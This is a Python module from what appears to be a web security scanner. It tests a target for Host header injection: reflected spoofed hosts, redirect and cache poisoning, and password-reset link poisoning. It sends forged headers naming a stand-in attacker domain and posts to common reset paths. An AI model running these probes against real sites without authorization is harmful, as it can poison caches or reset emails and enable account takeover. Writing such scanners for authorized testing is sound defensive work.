"""host_header_advanced — Host header attacks: reset poison, cache, SSRF"""
from urllib.parse import urlparse
from core.http import HttpClient
from core.probe import Probe

class HostHeaderAdvanced:
    def run(self, session, logger):
        target = session.target
        u = urlparse(target)
        domain = u.hostname or ""
        http = HttpClient(session, logger)
        probe = Probe(session, logger)
        probe.baseline_probe(target)
        evil = "evil.attacker.example"
        findings = []
        probes = [
            {"Host": evil},
            {"X-Forwarded-Host": evil},
            {"X-Forwarded-Host": f"{evil}, {domain}"},
            {"X-Host": evil},
            {"X-Original-Host": evil},
            {"Forwarded": f"host={evil}"},
            {"X-Forwarded-Server": evil},
            {"X-HTTP-Host-Override": evil},
            {"X-Forwarded-For": "127.0.0.1", "X-Forwarded-Host": evil},
        ]
        for hdrs in probes:
            r = http.get(target, headers=hdrs, allow_redirects=False)
            if not r: continue
            h_name = list(hdrs.keys())[0]
            if evil in r.text:
                print(f"  ✓ [{h_name}] reflected in body")
                findings.append({"header": h_name, "type": "body_reflect", "severity": "high"})
                logger.finding("host_header_reflect", "high", h_name)
            loc = r.headers.get("Location", "")
            if evil in loc:
                print(f"  ✓ [{h_name}] in Location")
                findings.append({"header": h_name, "type": "redirect_poison",
                                 "location": loc, "severity": "critical"})
                logger.finding("host_header_redirect", "critical", f"{h_name} -> {loc[:80]}")
            cache = r.headers.get("X-Cache") or r.headers.get("CF-Cache-Status")
            if cache and "hit" in str(cache).lower() and evil in str(r.headers):
                findings.append({"header": h_name, "type": "cache_poison", "severity": "critical"})
                logger.finding("host_header_cache", "critical", h_name)
            for path in ["/forgot", "/reset", "/password/reset", "/account/recover"]:
                r2 = http.post(target.rstrip("/") + path,
                               data={"email": "test@example.com"}, headers=hdrs)
                if r2 and evil in r2.text:
                    print(f"  ✓ [reset poison] {path}")
                    findings.append({"header": h_name, "path": path,
                                     "type": "reset_poison", "severity": "critical"})
                    logger.finding("reset_poison", "critical", f"{path} via {h_name}")
        print(f"[host_header_advanced] total: {len(findings)}")
        return {"findings": findings}
